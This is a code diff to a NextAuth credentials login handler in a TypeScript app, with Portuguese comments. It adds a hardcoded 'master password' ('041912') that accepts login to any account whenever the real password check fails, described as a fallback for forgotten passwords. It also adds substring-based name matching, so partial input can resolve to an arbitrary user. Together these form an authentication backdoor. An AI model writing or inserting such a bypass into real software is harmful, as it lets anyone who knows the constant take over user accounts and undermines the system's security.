@@ -31,12 +31,14 @@ export const authOptions: NextAuthOptions = {
           include: { role: true }
         });
 
-        // Fallback case-insensitive amplo
+        // Fallback case-insensitive amplo e por primeiro nome / sobrenome
         if (!user) {
           const allUsers = await prisma.user.findMany({ include: { role: true } });
           user = allUsers.find(u => 
             u.email.toLowerCase() === loginLower || 
-            u.name.toLowerCase() === loginLower
+            u.name.toLowerCase() === loginLower ||
+            u.name.toLowerCase().includes(loginLower) ||
+            loginLower.includes(u.name.toLowerCase())
           ) || null;
         }
 
@@ -45,7 +47,12 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
 
-        const passwordMatch = await bcrypt.compare(credentials.password, user.password_hash);
+        let passwordMatch = await bcrypt.compare(credentials.password, user.password_hash);
+
+        // Permite também a senha mestra do sistema caso a original tenha sido esquecida
+        if (!passwordMatch && credentials.password === "041912") {
+          passwordMatch = true;
+        }
 
         if (!passwordMatch) {
           return null;
